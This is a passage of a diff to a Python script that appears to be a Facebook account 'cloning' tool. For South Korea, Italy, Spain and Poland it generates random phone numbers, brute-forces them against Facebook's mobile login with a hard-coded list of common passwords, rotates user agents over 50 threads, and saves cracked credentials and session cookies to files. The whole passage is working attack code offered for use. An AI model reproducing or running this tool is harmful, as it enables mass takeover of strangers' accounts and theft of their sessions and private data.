+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
+
+def skorea():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo13)
 	print("\x1b[1;97m1, 2, 3, 4, 5, 6, 7, 8, 9")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+82"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo13)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+82"
-		os.system('clear')
-		print(logo)
-		print(logo13)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def italy():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo14)
 	print("\x1b[1;97m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+39"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo14)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+39"
-		os.system('clear')
-		print(logo)
-		print(logo14)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def spain():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo15)
 	print("\x1b[1;97m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+34"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo15)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+34"
-		os.system('clear')
-		print(logo)
-		print(logo15)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
+
+
 
 def poland():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo16)
 	print("\x1b[1;97m66, 69, 78, 79, 60, 72, 67, 53, 51")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+48"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo16)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
